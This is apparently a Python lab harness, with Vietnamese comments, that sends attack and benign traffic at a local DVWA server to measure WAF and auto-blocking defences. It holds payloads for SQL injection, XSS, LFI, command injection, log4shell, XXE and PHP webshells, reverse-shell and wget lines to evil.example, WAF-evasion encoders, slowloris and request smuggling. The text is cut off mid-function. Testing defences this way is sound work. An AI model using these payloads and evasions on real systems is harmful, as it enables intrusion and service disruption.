#!/usr/bin/env python3
"""tools/scenario.py — phần chạy TRONG container của khung kịch bản (gọi qua tools/scenario.sh, không chạy tay).

Một kịch bản = một tệp TOML trong scenarios/ (xem scenarios/README.md). Lệnh con:
  plan     đọc TOML, cấp IP cho từng tác nhân, in kế hoạch dạng dòng cho script host     (không cần mạng)
  actor    sinh lưu lượng cho MỘT tác nhân từ MỘT IP                                  (external_net)
  observe  lấy dữ liệu của hệ thống cho các IP của kịch bản trong khoảng thời gian      (monitor_net)
  judge    so kết quả với [expect] -> ĐẠT / KHÔNG ĐẠT / LỖ HỔNG ĐÃ BIẾT, kèm số đo        (không cần mạng)
  report   gộp nhiều kịch bản thành một báo cáo Markdown                                 (không cần mạng)
Chỉ dùng thư viện chuẩn của Python 3.11+ (tomllib). Đích duy nhất: máy chủ web của lab (10.10.10.10).
"""
import argparse, base64, http.client, json, os, random, re, socket, ssl, sys, time, urllib.parse
try:
    import tomllib
except ImportError:           # Python < 3.11: chỉ các hàm tổng hợp/báo cáo dùng được (kiểm thử trên host)
    tomllib = None
import urllib.request, zipfile
from collections import Counter, defaultdict
from datetime import datetime, timezone
from xml.sax.saxutils import escape as xml_escape

TARGET = os.getenv("SC_TARGET", "10.10.10.10")
# Host như trình duyệt thật (tên miền). Gửi tới địa chỉ IP thì CRS luật 920350 cộng sẵn 3 điểm cho MỌI request, làm
# số đo chặn nhầm của Cổng 2 bị thổi phồng (đo 12/11: 2/11 ca chặn nhầm chỉ xảy ra khi Host là IP).
HOST = os.getenv("NSM_HOST", "dvwa.local")
ES_URL = os.getenv("ES_URL", "http://elasticsearch:9200").rstrip("/")
MARK = "nsm-sc"
UA = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
POOL_FIRST, POOL_SIZE = (10, 10, 11, 1), 1270   # IP tác nhân: 10.10.11.1–10.10.15.254 (external_net = 10.10.0.0/20)


def note(m):
    print(m, file=sys.stderr, flush=True)


def out(o):
    print(json.dumps(o, ensure_ascii=False), flush=True)


# =====================================================================
# Payload theo họ. Ví dụ CỔ ĐIỂN, công khai (OWASP, PayloadsAllTheThings, tài liệu CRS); bộ lớn hơn lấy từ
# dataset đã tải (eval/data/...) hoặc từ GoTestWAF / waf-bypass (đợt S4).
# =====================================================================
PAYLOADS = {
    "sqli": ["1' OR '1'='1", "1 UNION SELECT user,password FROM users-- -", "1' AND SLEEP(2)-- -",
             "1' AND extractvalue(1,concat(0x7e,version()))-- -", "' OR ''='", "1;DROP TABLE users-- -",
             "admin'-- ", "1' ORDER BY 3-- -"],
    "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>",
            "\"><script>alert(document.cookie)</script>", "<body onload=alert(1)>", "javascript:alert(1)",
            "<iframe src=javascript:alert(1)>", "<details open ontoggle=alert(1)>"],
    "lfi": ["../../../../etc/passwd", "....//....//....//etc/passwd", "/etc/passwd", "..\\..\\..\\windows\\win.ini",
            "php://filter/convert.base64-encode/resource=index.php", "../../../../proc/self/environ",
            "file:///etc/passwd", "../../../../etc/passwd\x00.jpg"],
    "rce": ["127.0.0.1;id", "127.0.0.1|whoami", "127.0.0.1&&cat /etc/passwd", "127.0.0.1`id`", "127.0.0.1$(whoami)",
            "127.0.0.1;uname -a", "127.0.0.1\nid", "127.0.0.1||ls -la"],
    "ssrf": ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:22/", "http://localhost/server-status",
             "gopher://127.0.0.1:6379/_INFO", "http://[::1]/", "dict://127.0.0.1:11211/stats",
             "http://0x7f000001/", "file:///etc/hosts"],
    "ssti": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{config.items()}}",
             "{{''.__class__.__mro__[1].__subclasses__()}}", "${T(java.lang.Runtime).getRuntime().exec('id')}",
             "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"],
    "xxe": ['<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
            '<!DOCTYPE r [<!ENTITY % p SYSTEM "http://evil.example/x.dtd"> %p;]><r/>',
            '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/resource=index.php">]><r>&x;</r>'],
    "nosqli": ['{"$ne": null}', '{"$gt": ""}', "[$ne]=1", "'; return true; var x='", '{"$where": "sleep(1000)"}',
               "true, $where: '1 == 1'"],
    "ldap": ["*)(uid=*))(|(uid=*", "admin)(&)", "*)(|(objectclass=*)", "x)(|(password=*))"],
    "crlf": ["x%0d%0aSet-Cookie:%20nsm=1", "x\r\nLocation: http://evil.example/", "%0d%0aContent-Length:0%0d%0a%0d%0a",
             "x\r\nX-Injected: 1"],
    "redirect": ["//evil.example", "https://evil.example/", "/\\evil.example", "//evil.example/%2f..",
                 "https:evil.example"],
    "log4shell": ["${jndi:ldap://evil.example/a}", "${${lower:j}ndi:${lower:l}dap://evil.example/a}",
                  "${jndi:dns://evil.example/a}", "${${::-j}${::-n}${::-d}${::-i}:rmi://evil.example/a}"],
    "shellshock": ["() { :; }; /bin/id", "() { :;}; echo; /bin/cat /etc/passwd", "() { _; } >_[$($())] { id; }"],
    "deser": ['O:8:"stdClass":1:{s:1:"a";s:2:"id";}', 'a:1:{i:0;O:4:"Test":0:{}}',
              "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwAC", 'O:+8:"stdClass":0:{}'],
    "rfi": ["http://evil.example/shell.txt", "https://evil.example/x.php?", "ftp://evil.example/x.txt",
            "\\\\evil.example\\share\\x.php"],
    "upload": ["<?php system($_GET['c']); ?>", "<?php echo shell_exec($_REQUEST['x']); ?>",
               "GIF89a<?php eval($_POST['p']); ?>"],
    # dò mật khẩu: các mật khẩu phổ biến (danh sách công khai kiểu "top passwords")
    "login": ["123456", "password", "12345678", "qwerty", "123456789", "12345", "111111", "1234567", "dragon",
              "abc123", "letmein", "monkey", "iloveyou", "admin123", "welcome", "sunshine", "princess", "football"],
    # --- cho kịch bản sinh luật (B3, D2, D4, vòng đời luật) ---
    "rce_seed": ["127.0.0.1;cat /etc/passwd", "127.0.0.1;cat /etc/shadow", "127.0.0.1;wget http://evil.example/x",
                 "127.0.0.1;curl http://evil.example/s", "127.0.0.1;uname -a", "127.0.0.1;nc -e /bin/sh evil.example 4444",
                 "127.0.0.1;bash -i", "127.0.0.1|cat /etc/hosts"],
    # biến thể CHƯA có trong rce_seed; CRS 4.25 PL1 không chặn dạng ';id' (đo 12/11) -> chỉ luật tự sinh chặn được
    "rce_variant": ["127.0.0.1;id", "10.0.0.7;id", "192.168.1.9|id", "127.0.0.1;ls /tmp", "8.8.4.4;id", "127.0.0.1&&id"],
    # đầu độc (D2): gắn 'laptop' — giá trị phổ biến nhất của lưu lượng hợp lệ — vào mọi payload
    "sqli_poison": ["laptop' union select 1,2-- -", "laptop' union select user,password from users-- -",
                    "laptop' union select null,version()-- -", "laptop' union select table_name,2 from dual-- -",
                    "laptop' union select 3,4-- -", "laptop' union select database(),user()-- -"],
    "sqli_quote": ["1' or '1'='1", "admin'-- ", "' or ''='", "1' or 'a'='a", "x' or 1=1-- -", "1' and '1'='1"],
    # dò mật khẩu / bí mật: giá trị sinh ngẫu nhiên lúc chạy (xem run_http), danh sách này chỉ để có họ
    "secret": ["(sinh lúc chạy)"],
    # lành tính
    "benign_quote": ["O'Brien", "don't stop me now", "rock 'n' roll", "it's ok", "Côte d'Ivoire", "McDonald's menu",
                     "Harry's bar", "we'll see"],
    "benign_ip": ["8.8.8.8", "1.1.1.1", "192.168.1.10", "10.0.0.1", "9.9.9.9", "172.16.5.4"],
    "benign": ["laptop", "chuột không dây", "bàn phím cơ", "order by price", "Nguyễn Văn An", "2024-11-12",
               "giày thể thao size 42", "hello world", "tai nghe bluetooth", "sách lập trình python"],
    "benign_hard": ["O'Brien", "Tom & Jerry", "rock 'n' roll", "x < y and y > z", "50% off today", "C# and C++",
                    "select a laptop for school", "drop by tomorrow", "1=1 is always true", "don't stop me now",
                    "price: $5; tax: 10%", "use <b>bold</b> for emphasis", "SQL tip: SELECT name FROM users",
                    "a;b;c", "#hashtag"],
    # mơ hồ: văn bản chứa NGUYÊN cú pháp tấn công — không phân biệt được với tấn công nếu không biết ứng dụng (vd ô soạn
    # bài của diễn đàn lập trình). Được phép bị Cổng 2 chặn; KHÔNG được làm người gửi bị khoá IP nếu chỉ thỉnh thoảng.
    # (Trước 12/11 câu <script> nằm trong benign_hard và gây toàn bộ 9 ca "chặn nhầm" của kịch bản 01/02.)
    "ambiguous": ["how does the <script> tag work", "the classic ' OR '1'='1 login bypass explained",
                  "why ../../etc/passwd is dangerous"],
}
BENIGN_FAMS = ("benign", "benign_hard", "ambiguous", "benign_quote", "benign_ip")
CORE = ("sqli", "xss", "lfi", "rce")
# điểm vào DVWA (chế độ lab: không đăng nhập, mức thấp) cho họ có lỗ hổng tương ứng
DVWA = {"sqli": ("GET", "/vulnerabilities/sqli/", "id", [("Submit", "Submit")]),
        "xss": ("GET", "/vulnerabilities/xss_r/", "name", []),
        "lfi": ("GET", "/vulnerabilities/fi/", "page", []),
        "rce": ("POST", "/vulnerabilities/exec/", "ip", [("Submit", "Submit")]),
        "rfi": ("GET", "/vulnerabilities/fi/", "page", []),
        "login": ("POST", "/login.php", "password", [("username", "admin"), ("Login", "Login")])}
GENERIC = ("GET", "/index.php", "q", [])
PLACEMENTS = ("query", "form", "path", "json", "xml", "multipart", "upload", "cookie", "ua", "referer", "header",
              "param_name")


def load_dataset(source, family, limit=200, seed=1):
    """Payload từ dataset đã tải (eval/data, mount chỉ đọc ở /eval). Trả [] nếu không có."""
    rng = random.Random(seed)
    if source == "openappsec":
        fmap = {"sqli": "sqli", "xss": "xss", "lfi": "traversal", "rce": "cmdexe", "log4shell": "log4shell",
                "shellshock": "shellshock", "xxe": "xxe"}
        p = "/eval/data/openappsec/malicious.zip"
        if family not in fmap or not os.path.exists(p):
            return []
        rows = json.loads(zipfile.ZipFile(p).read(f"Malicious/{fmap[family]}.json"))
        vals = []
        for r in rows:
            q = (r.get("url") or "").partition("?")[2]
            v = urllib.parse.parse_qs(q, keep_blank_values=True).get("p", [None])[0]
            if not v and r.get("data"):
                v = r["data"]
            if v:
                vals.append(v)
        rng.shuffle(vals)
        return vals[:limit]
    return []


# =====================================================================
# Kỹ thuật né tránh (áp lên payload TRƯỚC khi đặt vào request)
# =====================================================================
def ev_case(v, r): return "".join(c.upper() if c.isalpha() and r.random() < .5 else c.lower() for c in v)
def ev_comment(v, r): return v.replace(" ", "/**/")
def ev_ws(v, r): return "".join(r.choice(["\t", "\n", "  ", "\x0b"]) if c == " " else c for c in v)
def ev_fullwidth(v, r): return "".join(chr(ord(c) + 0xFEE0) if c in "<>'\"()/;" else c for c in v)
def ev_null(v, r): return v + "\x00"
def ev_html(v, r): return "".join(f"&#x{ord(c):x};" if c in "<>'\"()" else c for c in v)
def ev_b64(v, r): return base64.b64encode(v.encode()).decode()
def ev_jsuni(v, r): return "".join(f"\\u{ord(c):04x}" if c in "<>'\"()" else c for c in v)


EVASION_PAYLOAD = {"case": ev_case, "comment": ev_comment, "ws": ev_ws, "fullwidth": ev_fullwidth, "null": ev_null,
                   "html": ev_html, "b64": ev_b64, "jsuni": ev_jsuni}
EVASION_WIRE = ("double_url", "uni", "hpp", "chunked")          # áp ở bước mã hoá/gửi


def enc(v, evasion):
    """Mã hoá giá trị để đặt vào URL/thân form."""
    if "uni" in evasion:
        return "".join(f"%u{ord(c):04x}" if c in "<>'\"()/;= " else urllib.parse.quote(c, safe="") for c in v)
    e = urllib.parse.quote(v, safe="")
    if "double_url" in evasion:
        e = e.replace("%", "%25")
    return e


# =====================================================================
# Dựng request theo vị trí đặt payload
# =====================================================================
def build(family, placement, payload, evasion=(), marker="", path=None, param=None, method=None):
    """-> dict(method, path, body, headers). path có thể đã kèm query thô."""
    m, p, prm, extra = DVWA.get(family, GENERIC)
    p, prm, m = path or p, param or prm, method or m
    h = {"User-Agent": f"{UA} {marker}".strip(), "Accept": "*/*", "Connection": "close"}
    ex = "&".join(f"{k}={v}" for k, v in extra)
    body = None

    def qs(name, val):
        s = f"{enc(name, ()) if name else ''}={enc(val, evasion)}"
        if "hpp" in evasion:                       # lặp tham số: bản lành tính trước, payload sau
            s = f"{enc(name, ())}=1&{s}"
        return s + (("&" + ex) if ex else "")

    if placement == "query":
        if m == "POST":
            body, h["Content-Type"] = qs(prm, payload), "application/x-www-form-urlencoded"
        else:
            p = f"{p}?{qs(prm, payload)}"
    elif placement == "form":
        m, body, h["Content-Type"] = "POST", qs(prm, payload), "application/x-www-form-urlencoded"
    elif placement == "path":
        p = p.rstrip("/") + "/" + enc(payload, evasion)
    elif placement == "json":
        m, h["Content-Type"] = "POST", "application/json"
        body = json.dumps({prm: payload, "submit": "Submit"})
    elif placement == "xml":
        m, h["Content-Type"] = "POST", "application/xml"
        if str(family) in BENIGN_FAMS:             # văn bản hợp lệ phải được thoát ký tự (& < >) như ứng dụng thật làm;
            payload = xml_escape(payload)           # trước đây 'Tom & Jerry' thành XML hỏng, ứng dụng trả 500
        body = payload if payload.lstrip().startswith("<") else f"<?xml version=\"1.0\"?><r><{prm}>{payload}</{prm}></r>"
    elif placement in ("multipart", "upload"):
        m, b = "POST", f"----nsm{random.randint(10**8, 10**9)}"
        h["Content-Type"] = f"multipart/form-data; boundary={b}"
        if placement == "upload":
            # tệp lành tính mang tên/kiểu lành tính; trước đây luôn là shell.php nên CRS chặn cả tệp hợp lệ (12/12)
            fn, ctype = (("report.txt", "text/plain") if str(family).startswith("benign")
                         else ("shell.php", "application/x-php"))
            part = (f'Content-Disposition: form-data; name="uploaded"; filename="{fn}"\r\n'
                    f"Content-Type: {ctype}\r\n\r\n{payload}\r\n")
        else:
            part = f'Content-Disposition: form-data; name="{prm}"\r\n\r\n{payload}\r\n'
        body = f"--{b}\r\n{part}--{b}\r\nContent-Disposition: form-data; name=\"Upload\"\r\n\r\nUpload\r\n--{b}--\r\n"
    elif placement == "cookie":
        h["Cookie"] = f"security=low; {prm}={enc(payload, evasion)}"
    elif placement == "ua":
        h["User-Agent"] = f"{payload} {marker}".strip()
    elif placement == "referer":
        h["Referer"] = payload
    elif placement == "header":
        h["X-Api-Version"] = payload
    elif placement == "param_name":
        p = f"{p}?{enc(payload, evasion)}=1"
    # --- né classifier bằng cách ĐỆM (lỗi N3 của bản rà soát) ---
    elif placement == "pad_params":                 # payload sau 120 tham số đệm
        p = f"{p}?" + "&".join(f"p{i}=1" for i in range(120)) + "&" + qs(prm, payload)
    elif placement == "pad_value":                  # payload sau 2 100 ký tự đệm trong CÙNG một giá trị
        p = f"{p}?{qs(prm, 'a' * 2100 + payload)}"
    elif placement == "pad_json":                   # payload trong thân JSON, sau 4 200 ký tự đệm
        m, h["Content-Type"] = "POST", "application/json"
        body = json.dumps({"pad": "a" * 4200, prm: payload, "submit": "Submit"})
    else:
        raise SystemExit(f"vị trí lạ: {placement}")
    # giá trị header phải là latin-1 một dòng: xuống dòng (CRLF injection) giữ nguyên để thử thật, ký tự khác thay '?'
    for k in list(h):
        h[k] = h[k].encode("latin-1", "replace").decode("latin-1")
    return {"method": m, "path": p, "body": body, "headers": h}


def gate_of(status, data):
    if status == 403:
        return "gate1" if b"<center>nginx</center>" in data else "gate2"
    if status == 429:
        return "limit"
    if status == 0:
        return "error"
    if status in (400, 405, 408, 411, 413, 414, 431, 501, 505) or status < 0:
        return "reject"                    # máy chủ từ chối request (dị dạng / quá dài / phương thức lạ)
    return "pass"


def send(rq, https=False, chunked=False, timeout=10):
    t0 = time.time(); tp = time.perf_counter()
    try:
        if https:
            c = http.client.HTTPSConnection(TARGET, 443, timeout=timeout, context=ssl._create_unverified_context())
        else:
            c = http.client.HTTPConnection(TARGET, 80, timeout=timeout)
        c.putrequest(rq["method"], rq["path"], skip_host=True, skip_accept_encoding=True)
        if not any(k.lower() == "host" for k in rq["headers"]):
            c.putheader("Host", HOST)
        for k, v in rq["headers"].items():
            c.putheader(k, v)
        body = rq["body"].encode("utf-8", "surrogateescape") if isinstance(rq["body"], str) else rq["body"]
        if body is not None and chunked:
            c.putheader("Transfer-Encoding", "chunked"); c.endheaders()
            for i in range(0, len(body), 7):
                piece = body[i:i + 7]
                c.send(f"{len(piece):x}\r\n".encode() + piece + b"\r\n")
            c.send(b"0\r\n\r\n")
        else:
            if body is not None:
                c.putheader("Content-Length", str(len(body)))
            c.endheaders(body)
        r = c.getresponse(); data = r.read(); st = r.status; c.close()
        return {"t": t0, "status": st, "gate": gate_of(st, data), "ms": round((time.perf_counter() - tp) * 1000, 1)}
    except Exception as e:                     # noqa: BLE001
        return {"t": t0, "status": 0, "gate": "error", "ms": round((time.perf_counter() - tp) * 1000, 1),
                "err": type(e).__name__}


# =====================================================================
# plan
# =====================================================================
def load_scn(path):
    with open(path, "rb") as f:
        s = tomllib.load(f)
    s.setdefault("id", os.path.basename(path)[:-5])
    s.setdefault("actor", []); s.setdefault("fault", []); s.setdefault("override", {}); s.setdefault("expect", {})
    return s


def alloc_ips(s, slot):
    """Cấp IP từ dải 10.10.11.1–10.10.15.254. Mỗi kịch bản bắt đầu ở một độ lệch khác (theo slot) để IP của hai
    kịch bản liền nhau không trùng; trạng thái chặn của responder được xoá trước mỗi kịch bản (tools/scenario.sh)."""
    def ip_of(k):
        k %= POOL_SIZE
        c, d = divmod(k, 254)
        return f"10.10.{11 + c}.{1 + d}"
    k = (slot * 211) % POOL_SIZE
    for act in s["actor"]:
        act["_ips"] = []
        for _ in range(int(act.get("ips", 1))):
            act["_ips"].append(ip_of(k)); k += 1
    return s


def cmd_plan(a):
    s = alloc_ips(load_scn(a.file), a.slot)
    # dòng cho bash: KIND|giá trị...
    print(f"ID|{s['id']}")
    print(f"TITLE|{s.get('title', '')}")
    print(f"MAXS|{int(s.get('max_s', 120))}")
    print(f"SETTLE|{int(s.get('settle_s', 15))}")
    # rulegen chỉ chạy trong kịch bản khai báo rõ  rulegen = true  (cô lập: luật tự sinh của kịch bản trước
    # không được làm sai kết quả của kịch bản sau — lượt chạy thử 12/11 bị nhiễm luật 9900000)
    print(f"RULEGEN|{1 if s.get('rulegen') else 0}")
    # CRS tạm ở DetectionOnly trong N giây đầu (để tấn công "lọt" Cổng 2 và đủ điều kiện gom cụm sinh luật)
    print(f"MODSEC_DO|{int(s.get('modsec_detection_only_s', 0))}")
    # đếm số lần nginx nạp lại danh sách chặn trong kịch bản (E5)
    print(f"RELOADS|{1 if 'nginx_reload_max_per_min' in s['expect'] else 0}")
    for svc, kv in s["override"].items():
        for k, v in kv.items():
            print(f"OVR|{svc}|{k}|{v}")
    for cidr in s.get("exempt", []):
        if cidr == "self":                               # miễn trừ chính các IP của kịch bản (kịch bản đo lưới)
            for act in s["actor"]:
                for ip in act["_ips"]:
                    print(f"EXEMPT|{ip}/32")
        else:
            print(f"EXEMPT|{cidr}")
    for f in s["fault"]:
        print(f"FAULT|{f['service']}|{int(f.get('stop_at_s', 0))}|{int(f.get('start_at_s', -1))}")
    for i, act in enumerate(s["actor"]):
        for j, ip in enumerate(act["_ips"]):
            print(f"ACTOR|{i}|{j}|{ip}|{int(act.get('start_s', 0))}|{act.get('kind', 'http')}")


# =====================================================================
# actor
# =====================================================================
def payload_pool(act, rng):
    fam = act.get("family", "benign")
    src = act.get("source", "builtin")
    pool = load_dataset(src, fam, seed=rng.randint(1, 10**6)) if src != "builtin" else []
    return pool or list(PAYLOADS.get(fam, PAYLOADS["benign"]))


def cmd_actor(a):
    s = alloc_ips(load_scn(a.file), a.slot)
    act = s["actor"][a.index]
    ip = act["_ips"][a.ipn]
    rng = random.Random(f"{s['id']}/{a.index}/{a.ipn}")
    kind = act.get("kind", "http")
    t_start = time.time()
    res = {"scenario": s["id"], "actor": a.index, "name": act.get("name", ""), "role": act.get("role", "attack"),
           "ip": ip, "kind": kind, "t_start": t_start, "sent": [], "extra": {}}
    marker = f"{MARK}/{a.run}/{s['id']}/{a.index}"
    if kind == "http":
        run_http(act, rng, marker, res)
    elif kind == "matrix":
        run_matrix(act, rng, marker, res)
    elif kind == "recidivist":
        run_recidivist(act, rng, marker, res)
    elif kind == "slowloris":
        run_slowloris(act, res)
    elif kind == "malformed":
        run_malformed(act, res)
    elif kind == "replay":
        run_replay(act, rng, marker, res)
    else:
        raise SystemExit(f"kiểu tác nhân lạ: {kind}")
    res["t_end"] = time.time()
    g = Counter(x["gate"] for x in res["sent"])
    note(f"   [{s['id']}] {act.get('name', act.get('role'))} {ip}: {len(res['sent'])} request {dict(g)}")
    out(res)


def run_http(act, rng, marker, res):
    pool = payload_pool(act, rng)
    if act.get("shuffle"):                           # mỗi IP một thứ tự payload riêng (rng gieo theo IP)
        rng.shuffle(pool)
    fams = act.get("families") or [act.get("family", "benign")]
    placement = act.get("placement", "query")
    evasion = tuple(act.get("evasion", []))
    count, interval = int(act.get("count", 10)), float(act.get("interval_s", 0.5))
    https, stop_on_block = bool(act.get("https", False)), bool(act.get("stop_on_block", True))
    deadline = time.time() + float(act.get("max_s", 600))
    for i in range(count):
        if time.time() > deadline:
            break
        fam = fams[i % len(fams)]
        v = pool[i % len(pool)] if len(fams) == 1 else rng.choice(PAYLOADS.get(fam, PAYLOADS["benign"]))
        for e in evasion:
            if e in EVASION_PAYLOAD:
                v = EVASION_PAYLOAD[e](v, rng)
        if act.get("unique_suffix"):                  # biến thể: thêm số ngẫu nhiên để payload không trùng nhau
            v = f"{v}{rng.randint(1, 999)}" if fam in ("benign", "benign_hard") else v
        if fam == "secret":                           # mật khẩu / token sinh ngẫu nhiên, ghi lại để kiểm ES (C1)
            v = f"S3cret-{rng.randint(10**7, 10**8 - 1)}"
            res["extra"].setdefault("secrets", []).append(v)
        rq = build(fam, placement, v, evasion, marker, act.get("path"), act.get("param"), act.get("method"))
        if act.get("pad_chars") and rq["body"] and "urlencoded" in rq["headers"].get("Content-Type", ""):
            rq["body"] += "&note=" + ("lorem+ipsum+dolor+sit+amet+" * (int(act["pad_chars"]) // 27 + 1))[:int(act["pad_chars"])]
        uas = act.get("user_agents")                 # mỗi "người" sau NAT một trình duyệt (khớp thứ tự families)
        if uas:
            rq["headers"]["User-Agent"] = f"{uas[i % len(fams) % len(uas)]} {marker}".strip()
        if act.get("xff"):
            rq["headers"]["X-Forwarded-For"] = act["xff"]; rq["headers"]["X-Real-IP"] = act["xff"]
        r = send(rq, https=https, chunked="chunked" in evasion)
        r.update(fam=fam, i=i)
        res["sent"].append(r)
        if stop_on_block and r["gate"] == "gate1":
            break
        if interval:
            time.sleep(max(0.0, interval - r["ms"] / 1000))


def run_matrix(act, rng, marker, res):
    """Lưới họ × vị trí × né tránh, từ IP ĐƯỢC MIỄN TRỪ (không bị chặn giữa chừng). Mỗi request một mã riêng
    trong User-Agent để ghép với bản ghi Elasticsearch."""
    fams = act.get("families") or list(PAYLOADS)
    places = act.get("placements") or list(PLACEMENTS)
    evs = [tuple(e) if isinstance(e, list) else (e,) if e else () for e in act.get("evasions", [[]])]
    per = int(act.get("per_cell", 2))
    k = 0
    for fam in fams:
        pool = PAYLOADS[fam]
        for pl in places:
            for ev in evs:
                for j in range(per):
                    v = pool[(j * 3 + k) % len(pool)]
                    for e in ev:
                        if e in EVASION_PAYLOAD:
                            v = EVASION_PAYLOAD[e](v, rng)
                    mk = f"{marker}/{k}"
                    rq = build(fam, pl, v, ev, mk, act.get("path"), act.get("param"))
                    r = send(rq, chunked="chunked" in ev)
                    r.update(k=k, fam=fam, place=pl, ev="+".join(ev) or "-", payload=v[:120])
                    res["sent"].append(r)
                    k += 1
                    time.sleep(float(act.get("interval_s", 0.02)))


def run_recidivist(act, rng, marker, res):
    """Tấn công tới khi bị Cổng 1 chặn -> chờ được gỡ (thăm dò mỗi 2 giây) -> tấn công lại; lặp `rounds` vòng (E4)."""
    pool = payload_pool(act, rng)
    rounds, interval = int(act.get("rounds", 3)), float(act.get("interval_s", 0.5))
    deadline = time.time() + float(act.get("max_s", 900))
    rr = []
    for rd in range(rounds):
        t_first, t_block, i = time.time(), None, 0
        while time.time() < deadline:
            rq = build(act.get("family", "sqli"), act.get("placement", "query"), pool[i % len(pool)], (), marker)
            r = send(rq); r.update(round=rd, i=i); res["sent"].append(r); i += 1
            if r["gate"] == "gate1":
                t_block = r["t"]; break
            time.sleep(interval)
        if t_block is None:
            rr.append({"round": rd, "blocked": False}); break
        t_unblock = None
        while time.time() < deadline:                 # thăm dò bằng request lành tính
            time.sleep(2)
            r = send(build("benign", "query", "laptop", (), marker))
            if r["gate"] != "gate1":
                t_unblock = r["t"]; break
        rr.append({"round": rd, "blocked": True, "time_to_block_s": round(t_block - t_first, 1),
                   "blocked_for_s": round(t_unblock - t_block, 1) if t_unblock else None})
        if t_unblock is None:
            break
    res["extra"]["rounds"] = rr


def run_slowloris(act, res):
    """Mở N kết nối, mỗi kết nối gửi header nhỏ giọt; đếm bao nhiêu kết nối bị máy chủ cắt/từ chối."""
    n, dur = int(act.get("connections", 200)), float(act.get("duration_s", 30))
    socks, refused = [], 0
    for _ in range(n):
        try:
            s = socket.create_connection((TARGET, 80), timeout=3)
            s.send(b"GET /index.php HTTP/1.1\r\nHost: x\r\nUser-Agent: " + UA.encode() + b"\r\n")
            socks.append(s)
        except OSError:
            refused += 1
    t_end, alive_hist = time.time() + dur, []
    while time.time() < t_end:
        alive = []
        for s in socks:
            try:
                s.send(b"X-a: b\r\n"); alive.append(s)
            except OSError:
                pass
        socks = alive; alive_hist.append(len(socks)); time.sleep(5)
    for s in socks:
        try: s.close()
        except OSError: pass
    res["extra"] = {"connections": n, "refused_at_connect": refused, "alive_over_time": alive_hist}


def run_replay(act, rng, marker, res):
    """Phát lại request lành tính THẬT: tập test_sites (website openappsec chưa thấy khi huấn luyện) của dữ liệu đã chuẩn
    hoá (eval/data/normalized, mount chỉ đọc). Mỗi IP lấy một phần khác nhau (độ lệch ngẫu nhiên theo IP)."""
    import gzip
    p = "/eval/data/normalized/openappsec_legit.jsonl.gz"
    if not os.path.exists(p):
        res["extra"]["error"] = "không có dữ liệu chuẩn hoá"; return
    count, every, interval = int(act.get("count", 150)), int(act.get("every", 37)), float(act.get("interval_s", 0.05))
    off, n = rng.randrange(every), 0
    with gzip.open(p, "rt", encoding="utf-8") as f:
        for i, line in enumerate(f):
            if (i + off) % every:
                continue
            d = json.loads(line)
            method = (d.get("method") or "GET").upper()
            if d.get("split") != "test_sites" or d.get("over_limit") or method not in ("GET", "POST", "PUT", "PATCH",
                                                                                        "DELETE", "OPTIONS", "HEAD"):
                continue
            path = urllib.parse.quote(d.get("path") or "/", safe="/%:@!$&'()*+,;=-._~")
            q = urllib.parse.quote(d.get("query") or "", safe="/%:@!$&'()*+,;=-._~?")
            h = {"User-Agent": f"{d.get('ua') or UA} {marker}".strip(), "Accept": "*/*", "Connection": "close"}
            ct = d.get("ct") or ""
            if ct and ct != "-":
                h["Content-Type"] = ct
            for k in list(h):
                h[k] = h[k].encode("latin-1", "replace").decode("latin-1")
            body = d.get("body") or None
            r = send({"method": method, "path": path + ("?" + q if q else ""), "body": body, "headers": h})
            r.update(fam="replay", i=n)
            res["sent"].append(r); n += 1
            if n >= count:
                break
            time.sleep(interval)


def run_malformed(act, res):
    """Request dị dạng gửi bằng socket thô (ca C2)."""
    cases = {
        "dong_qua_dai": b"GET /?" + b"a" * 20000 + b" HTTP/1.1\r\nHost: x\r\n\r\n",
        "header_qua_dai": b"GET / HTTP/1.1\r\nHost: x\r\nX-Big: " + b"b" * 20000 + b"\r\n\r\n",
        "header_hong": b"GET / HTTP/1.1\r\nHost: x\r\nKhong co dau hai cham\r\n\r\n",
        "content_length_sai": b"POST /index.php HTTP/1.1\r\nHost: x\r\nContent-Length: 50\r\n\r\nabc",
        "smuggling_cl_te": (b"POST / HTTP/1.1\r\nHost: x\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n"
                            b"0\r\n\r\nSMUGGLED"),
        "phuong_thuc_la": b"PROPFIND / HTTP/1.1\r\nHost: x\r\n\r\n",
        "giao_thuc_la": b"GET / HTTP/9.9\r\nHost: x\r\n\r\n",
    }
    for name, raw in cases.items():
        t0 = time.time(); st = 0
        try:
            s = socket.create_connection((TARGET, 80), timeout=5); s.sendall(raw)
            data = s.recv(200); s.close()
            m = re.match(rb"HTTP/\d\.\d (\d{3})", data or b"")
            st = int(m.group(1)) if m else -1
        except OSError:
            st = 0
        res["sent"].append({"t": t0, "case": name, "status": st, "gate": gate_of(st, b"")})
        time.sleep(float(act.get("interval_s", 1)))


# =====================================================================
# observe
# =====================================================================
def es(method, path, body=None):
    data = json.dumps(body).encode() if body is not None else None
    rq = urllib.request.Request(ES_URL + path, data=data, method=method, headers={"Content-Type": "application/json"})
    if os.getenv("ES_USER"):
        cred = f"{os.getenv('ES_USER')}:{os.getenv('ES_PASSWORD', '')}".encode()
        rq.add_header("Authorization", "Basic " + base64.b64encode(cred).decode())
    with urllib.request.urlopen(rq, timeout=60) as r:
        return json.loads(r.read())


def iso(ts):
    return datetime.fromtimestamp(ts, tz=timezone.utc).isoformat(timespec="milliseconds").replace("+00:00", "Z")


def epoch(s):
    return datetime.fromisoformat(str(s).replace("Z", "+00:00")).timestamp()


def search_all(index, ips, t0, t1, src_fields, field="src_ip.keyword", extra=None):
    flt = [{"terms": {field: sorted(ips)}}, {"range": {"@timestamp": {"gte": iso(t0), "lte": iso(t1)}}}]
    if extra:
        flt.append(extra)
    try:
        return [h["_source"] for h in es("POST", f"/{index}/_search?ignore_unavailable=true",
                                         {"size": 10000, "_source": src_fields, "query": {"bool": {"filter": flt}},
